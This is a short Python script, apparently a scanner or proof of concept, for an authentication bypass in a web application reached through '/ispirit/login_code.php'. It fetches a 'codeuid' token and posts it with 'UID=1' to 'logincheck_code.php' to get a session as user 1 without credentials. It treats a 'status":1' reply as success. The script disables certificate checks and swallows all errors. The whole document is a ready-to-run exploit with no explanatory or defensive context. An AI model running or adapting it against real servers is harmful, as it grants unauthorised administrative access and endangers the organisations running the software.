import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(url):
	if 'http' not in url:
		url='http://'+url
	codeuid=get_codeuid(url)
	flag=getsession(url,codeuid)
	return flag
def get_codeuid(url):
	try:
		if url[-1]=='/':
			urls = url + "ispirit/login_code.php"
		else:
			urls = url + "/ispirit/login_code.php"
		headers={
		'Content-Type': 'application/x-www-form-urlencoded'
		}
		body=''
		r=requests.post(urls,body,headers=headers,verify=False,timeout=5)
		if r.status_code==200 and 'codeuid"' in r.text:
			codeuid=r.json()['codeuid']
			
		else:
			codeuid=0
	except:
		codeuid=0
	return codeuid
def getsession(urls,codeuid):
	try:
		if urls[-1]=='/':
			url = urls + "logincheck_code.php"
		else:
			url = urls + "/logincheck_code.php"

		headers = {
			'Content-Type': 'application/x-www-form-urlencoded',
	}
		body='UID=1&CODEUID=_PC'+codeuid
		r=requests.post(url,body,headers=headers,verify=False,timeout=5)
		if 'status":1' in r.text:
			flag=True
		else:
			flag=False
	except:
		flag=False
	return flag
		